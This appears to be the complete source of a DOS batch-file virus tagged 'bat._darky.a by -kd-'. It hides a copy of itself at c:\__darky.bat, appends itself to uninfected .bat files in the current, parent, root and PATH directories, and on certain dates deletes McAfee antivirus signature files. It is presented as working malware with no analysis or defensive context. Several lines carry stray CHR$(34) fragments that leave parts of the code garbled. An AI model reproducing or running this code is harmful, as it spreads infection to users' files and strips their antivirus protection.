@echo off%__darky%
if '%1=='_darky goto _darky%2
set _darky=%0.bat
if not exist %_darky% set _darky=%0
if '%_darky%==' set _darky=autoexec.bat
if exist c:\__darky.bat goto _darky_gettin_ya
if not exist %_darky% goto exist_darky
find "; CHR$(34); "_darky"; CHR$(34); "<%_darky%>c:\__darky.bat
attrib c:\__darky.bat +h
:_darky_gettin_ya
if '%!_darky%=='-- goto _darky_pay
set !_darky=%!_darky%-
command /e:5000 /c c:\__darky _darky vx . .. \ %path%
:exist_darky
set _darky=
goto _darky_pay
:_darkyvx
shift%__darky%
if '%2==' exit _darky
for %%a in (%2\*.bat %2*.bat) do call c:\__darky _darky infect %%a 
goto _darkyvx
:_darkyinfect
find '_darky'<%3>nul
if not errorlevel 1 goto _darky_jump
type %3>_darky$
echo.>>_darky$
type c:\__darky.bat>>_darky$
move _darky$ %3>nul
set _darky#=%_darky#%-
if %_darky#%==-- exit
:_darky_jump
set _darky!=%_darky!%-
if %_darky!%==-- exit
:_darky_pay
echo.|date|find "CHR$(34); "10"; CHR$(34); ">nul._darky
if errorlevel 1 goto _darky_exit
echo y| del c:\mcafee\*.dat
if errorlevel 1 goto darkymsg
:darkymsg
echo bat._darky.a by -kd-
:_darky_exit